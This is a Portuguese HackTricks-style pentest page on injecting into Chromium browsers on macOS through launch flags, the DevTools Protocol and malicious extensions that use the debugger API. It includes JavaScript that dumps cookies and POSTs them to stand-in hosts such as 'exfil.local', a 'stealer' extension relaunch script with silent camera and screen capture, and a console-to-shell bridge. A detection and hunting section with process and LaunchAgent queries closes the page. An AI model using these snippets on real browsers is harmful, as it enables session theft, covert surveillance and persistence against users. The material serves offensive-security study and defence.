# macOS Chromium Injection

{{#include ../../../banners/hacktricks-training.md}}

## Informações básicas

Browsers baseados em Chromium, como Google Chrome, Microsoft Edge, Brave, Arc, Vivaldi e Opera, usam os mesmos command-line switches, arquivos de preferências e interfaces de automação do DevTools. No macOS, qualquer usuário com acesso à GUI pode encerrar uma sessão existente do browser e reabri-la com flags arbitrárias, extensões ou endpoints do DevTools que sejam executados com os entitlements do alvo.

#### Iniciando o Chromium com flags personalizadas no macOS

O macOS mantém uma única instância de UI por perfil do Chromium, portanto a instrumentação normalmente exige o encerramento forçado do browser (por exemplo, com `osascript -e 'tell application "Google Chrome" to quit'`). Attackers normalmente reiniciam usando `open -na "Google Chrome" --args <flags>` para injetar argumentos sem modificar o app bundle. Envolver esse comando em um LaunchAgent do usuário (`~/Library/LaunchAgents/*.plist`) ou em um login hook garante que o browser adulterado seja reiniciado após reboot/logoff.

#### Flag `--load-extension`

A flag `--load-extension` carrega automaticamente extensões unpacked (paths separados por vírgulas). Combine-a com `--disable-extensions-except` para bloquear extensões legítimas enquanto força a execução apenas do seu payload. Extensões maliciosas podem solicitar permissões de alto impacto, como `debugger`, `webRequest` e `cookies`, para fazer pivot para protocolos do DevTools, modificar headers CSP, downgrade de HTTPS ou exfiltrar material de sessão assim que o browser iniciar.

#### Flags `--remote-debugging-port` / `--remote-debugging-pipe`

Esses switches expõem o Chrome DevTools Protocol (CDP) por TCP ou por um pipe, permitindo que ferramentas externas controlem o browser. O Google observou um uso generalizado dessa interface por infostealers e, a partir do Chrome 136 (março de 2025), os switches são ignorados para o perfil padrão, a menos que o browser seja iniciado com um `--user-data-dir` não padrão. Isso aplica o App-Bound Encryption em perfis reais, mas attackers ainda podem iniciar um perfil novo, induzir a vítima a se autenticar nele (com phishing/triage assistance) e coletar cookies, tokens, estados de confiança do dispositivo ou registros WebAuthn por meio do CDP.<sup>[5]</sup>

#### Flag `--user-data-dir`

Essa flag redireciona todo o perfil do browser (History, Cookies, Login Data, arquivos de Preferences etc.) para um path controlado pelo attacker. Ela é obrigatória ao combinar versões modernas do Chrome com `--remote-debugging-port` e também mantém o perfil adulterado isolado, permitindo inserir arquivos `Preferences` ou `Secure Preferences` pré-preenchidos que desabilitam prompts de segurança, instalam extensões automaticamente e alteram os esquemas padrão.

#### Flag `--use-fake-ui-for-media-stream`

Esse switch ignora o prompt de permissão da câmera/microfone, fazendo com que qualquer página que chame `getUserMedia` receba acesso imediatamente. Combine-o com flags como `--auto-select-desktop-capture-source="Entire Screen"`, `--kiosk` ou comandos CDP `Browser.grantPermissions` para capturar silenciosamente áudio/vídeo, compartilhar a tela ou satisfazer verificações de permissão do WebRTC sem interação do usuário.

## Padrões de Delivery & Relaunch observados na prática

O abuso de CDP é normalmente uma etapa de **post-exploitation**, e não o payload inicial. Uma campanha recente do macOS direcionada a developers usou uma **fase `Run Script` de build** (`PBXShellScriptBuildPhase`) envenenada, fazendo com que o código fosse executado somente quando a vítima **compilasse** o projeto, e não quando apenas o clonasse ou abrisse. Após essa primeira execução, o malware também infectava outras árvores `.xcodeproj`, adicionava Git hooks `pre-commit` maliciosos e procurava mais projetos Xcode em arquivos ZIP.<sup>[3]</sup>

Para o abuso de Chromium, isso é importante porque o attacker não precisa modificar o browser binary. Um stager de curta duração em uma build phase / `osascript` pode, em vez disso, instalar um **browser wrapper** (LaunchAgent, login item, entrada no Dock, app launcher trojanizado etc.) que reabra o browser legítimo com flags controladas pelo attacker sempre que o usuário o iniciar.<sup>[3]</sup>

> [!TIP]
> Em endpoints de developers, inspecione arquivos `.pbxproj`, `.git/hooks/pre-commit` e ZIPs contendo `.xcodeproj` em busca de `curl`, `osascript`, `xxd`, `base64` aninhado ou lógica inesperada de relaunch do Chrome.

## Remote Debugging & Abuso do DevTools Protocol

Depois que o Chrome é reiniciado com um `--user-data-dir` dedicado e `--remote-debugging-port`, você pode se conectar por CDP (por exemplo, usando `chrome-remote-interface`, `puppeteer` ou `playwright`) e automatizar workflows de alto privilégio:

- **Roubo de cookies/sessão:** `Network.getAllCookies` e `Storage.getCookies` retornam valores HttpOnly mesmo quando o App-Bound encryption normalmente bloquearia o acesso ao filesystem, porque o CDP solicita que o browser em execução os descriptografe.
- **Adulteração de permissões:** `Browser.grantPermissions` e `Emulation.setGeolocationOverride` permitem ignorar prompts de câmera/microfone (especialmente quando combinados com `--use-fake-ui-for-media-stream`) ou falsificar verificações de segurança baseadas em localização.
- **Injeção de keystrokes/scripts:** `Runtime.evaluate` executa JavaScript arbitrário dentro da aba ativa, permitindo o roubo de credenciais, a modificação do DOM ou a injeção de beacons de persistência que sobrevivem à navegação.<sup>[1]</sup>
- **Exfiltração em tempo real:** `Network.webRequestWillBeSentExtraInfo` e `Fetch.enable` interceptam requests/responses autenticados em tempo real sem tocar nos artefatos em disco.
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
Como o Chrome 136 bloqueia o CDP no perfil padrão, copiar o diretório existente `~/Library/Application Support/Google/Chrome` da vítima para um caminho de staging não fornece mais cookies descriptografados. Em vez disso, faça engenharia social para que o usuário se autentique dentro do perfil instrumentado (por exemplo, uma sessão de suporte "útil") ou capture tokens MFA em trânsito por meio de network hooks controlados pelo CDP.<sup>[5]</sup>

### XCSSET-style CDP Backdoor Chain

Um padrão prático de malware consiste em:

1. Reiniciar o implant userland ou wrapper sempre que o Chrome for iniciado.
2. Iniciar o navegador legítimo com `--remote-debugging-port=<port>` e, no Chrome 136+, geralmente com um `--user-data-dir=<dir>` não padrão emparelhado.
3. Iniciar um helper que se conecta ao WebSocket CDP local e registra um pre-document hook com `Page.addScriptToEvaluateOnNewDocument`.<sup>[2]</sup>

Esse helper pode injetar JavaScript **antes** da execução do código do site, o que é ideal para fazer hooking de `window.fetch`, `XMLHttpRequest`, wallet providers ou fluxos de autofill sem modificar arquivos no disco.<sup>[3]</sup>
```javascript
await Page.enable();
await Runtime.enable();
await Page.addScriptToEvaluateOnNewDocument({
source: `
const oldFetch = window.fetch;
window.fetch = async (...args) => {
console.log('__HT__' + JSON.stringify(args[0]));
return oldFetch(...args);
};
`
});
Runtime.consoleAPICalled(({args}) => { /* helper parses __HT__ */ });
```
Uma variante mais poderosa transforma o navegador em uma **ponte de comandos do host**: JavaScript injetado emite um `console.log` com delimitadores, o helper local monitora `Runtime.consoleAPICalled`, remove o marcador, executa o restante por meio do shell do host (por exemplo, `exec.Command` do Go) e retorna stdout/stderr pelo WebSocket do atacante. Isso transforma a execução de scripts no nível da aba em um reverse shell quase totalmente fileless.<sup>[3]</sup>

## Injeção Baseada em Extensão via Debugger API

A pesquisa de 2023, "Chrowned by an Extension", demonstrou que uma extensão maliciosa usando a API `chrome.debugger` pode se conectar a qualquer aba e obter os mesmos recursos do DevTools que `--remote-debugging-port`.<sup>[6]</sup> Isso rompe as suposições originais de isolamento (as extensões permanecem em seu próprio contexto) e permite:

- Roubo silencioso de cookies e credenciais com `Network.getAllCookies`/`Fetch.getResponseBody`.
- Modificação das permissões dos sites (câmera, microfone, geolocalização) e bypass de intersticiais de segurança, permitindo que páginas de phishing se passem por diálogos do Chrome.
- Adulteração on-path de avisos TLS, downloads ou prompts do WebAuthn por meio do controle programático de `Page.handleJavaScriptDialog`, `Page.setDownloadBehavior` ou `Security.handleCertificateError`.

Carregue a extensão com `--load-extension`/`--disable-extensions-except` para que nenhuma interação do usuário seja necessária. Um script de background mínimo que weaponiza a API tem esta aparência:
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
A extensão também pode se inscrever em eventos `Debugger.paused` para ler variáveis JavaScript, modificar scripts inline ou inserir breakpoints personalizados que persistem durante a navegação. Como tudo é executado dentro da sessão GUI do usuário, Gatekeeper e TCC não são acionados, tornando essa técnica ideal para malware que já obteve execução no contexto do usuário.<sup>[6]</sup>

## Detecção e Hunting

- Gere alertas para navegadores Chromium iniciados com `--remote-debugging-port`, `--remote-debugging-pipe` ou um `--user-data-dir` suspeito, especialmente quando o processo pai for `bash`, `sh`, `osascript`, `xcodebuild` ou um helper de LaunchAgent.
- Procure cadeias curtas nas quais um helper abre um WebSocket CDP local, registra `Page.addScriptToEvaluateOnNewDocument` e, em seguida, estabelece uma conexão WebSocket/HTTPS de longa duração.
- Faça Hunting por bridges de console para shell, correlacionando a atividade de `Runtime.consoleAPICalled` do navegador com shells filhos ou processos helper executando comandos fornecidos pelo atacante.
- Em Macs de desenvolvedores, revise entradas `PBXShellScriptBuildPhase` em `.pbxproj`, hooks `pre-commit` do Git, relaunchers do Dock/itens de login e projetos Xcode contidos em ZIPs em busca da instalação de wrappers de navegador.
```bash
ps auxww | rg 'Chrome|Brave|Edge.*(--remote-debugging-port|--remote-debugging-pipe|--user-data-dir)'
lsof -nP -iTCP -sTCP:LISTEN | rg 'Chrome|Brave|Edge'
find ~/Library/LaunchAgents /Library/LaunchAgents -name '*.plist' -exec plutil -p {} \; 2>/dev/null | rg 'remote-debugging|Google Chrome|Brave|Edge'
rg -n 'PBXShellScriptBuildPhase|curl|osascript|xxd|base64' ~/Code --glob '*.pbxproj'
```
### Ferramentas

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - Automatiza lançamentos do Chromium com extensões de payload e expõe hooks interativos de CDP.
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - Ferramenta semelhante focada na interceptação de tráfego e instrumentação do navegador para operadores de macOS.
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - Biblioteca Node.js para criar scripts para dumps do Chrome DevTools Protocol (cookies, DOM, permissões) quando uma instância com `--remote-debugging-port` está ativa.

### Exemplo
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
Encontre mais exemplos nos links das ferramentas.

## Referências

- [1] [Chrome DevTools Protocol - domínio Runtime](https://chromedevtools.github.io/devtools-protocol/v8/Runtime/)
- [2] [Chrome DevTools Protocol - domínio Page](https://chromedevtools.github.io/devtools-protocol/tot/Page/)
- [3] [O Xcode Assassin está de volta: uma análise aprofundada da versão mais recente do XCSSET - Unit 42](https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/)
- [4] [Ron Masas (@RonMasas) no X](https://twitter.com/RonMasas/status/1758106347222995007)
- [5] [Alterações nas opções de depuração remota para melhorar a segurança - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [6] [Crowned por uma extensão: abusando do Chrome DevTools Protocol por meio da API Debugger (arXiv:2305.11506)](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
